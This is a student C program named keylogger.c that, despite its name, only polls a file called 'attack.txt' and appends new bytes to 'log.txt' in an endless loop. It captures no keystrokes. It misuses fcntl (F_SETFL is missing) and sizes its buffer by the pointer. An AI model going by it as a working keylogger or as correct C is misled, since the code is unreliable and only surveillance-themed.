/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylogger.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hece <hece@student.42kocaeli.com.tr>       +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/04/25 13:44:40 by hece              #+#    #+#             */
/*   Updated: 2023/04/25 16:03:36 by hece             ###   ########.tr       */
/*                                                                            */
/* ************************************************************************** */

#include "keylogger.h"

static inline void
	ft_keylogger(void)
{
	t_keylogger	keylogger;

	keylogger.buf = (char *)malloc(sizeof(char) * 8);
	keylogger.log_fd = open("log.txt", O_RDWR | O_CREAT
			| O_APPEND, S_IRUSR | S_IWUSR);
	keylogger.attack_fd = open("attack.txt", O_RDWR);
	keylogger.flags = fcntl(keylogger.attack_fd, F_GETFL);
	keylogger.nbytes = 0;
	fcntl(keylogger.attack_fd, keylogger.flags | O_NONBLOCK);
	while (42)
	{
		lseek(keylogger.attack_fd, keylogger.nbytes, SEEK_SET);
		keylogger.bytes = read(keylogger.attack_fd, keylogger.buf,
				sizeof(keylogger.buf));
		if (keylogger.bytes > 0)
		{
			write(keylogger.log_fd, keylogger.buf, keylogger.bytes);
			keylogger.nbytes += keylogger.bytes;
		}
		usleep(100000);
	}
	close(keylogger.log_fd);
	close(keylogger.attack_fd);
}

int
	main(int ac, char *av[])
{
	(void)ac;
	(void)av;
	ft_keylogger();
	return (0);
}
